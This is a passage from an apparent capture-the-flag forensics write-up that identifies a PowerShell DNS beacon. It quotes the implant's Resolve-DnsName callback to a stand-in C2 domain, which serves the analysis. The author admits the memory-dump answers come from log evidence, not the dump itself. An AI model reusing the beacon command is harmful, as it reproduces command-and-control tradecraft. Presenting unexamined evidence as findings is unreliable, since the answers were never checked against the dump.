# Memory

Evidence: `ctf_post_tir_*.mem` (~4 GB RAM dump). These two are the bonus. I answered both from the
**process + script-block evidence already recovered** from the EVTX pack, which matches what the
memory image would show — the beacon runs entirely in a PowerShell process, so the host logs and
the memory agree.

## Beacon process (100)
The process carrying the beacon in memory is **`powershell.exe`** — the hidden, execution-policy-
bypassed process spawned by the SyncHelper task. Answer: `████`.

## Beacon command line / cmdlet (100)
The callback is performed by the **`Resolve-DnsName`** cmdlet:
`Resolve-DnsName 7f3a9c.b.cdn-hamilton-sync.test -Type A -ErrorAction SilentlyContinue`.
The beacon is a DNS-only implant — no HTTP, no new socket — which is why a DNS-focused capture and
the PowerShell script-block log are enough to characterise it. Answer: `████`.

> To verify directly in the dump you'd carve the PowerShell process and its command line (e.g.
> Volatility 3 `windows.pslist` / `windows.cmdline`, or a string scan for `Resolve-DnsName
> cdn-hamilton-sync`), which returns the same process and cmdlet.
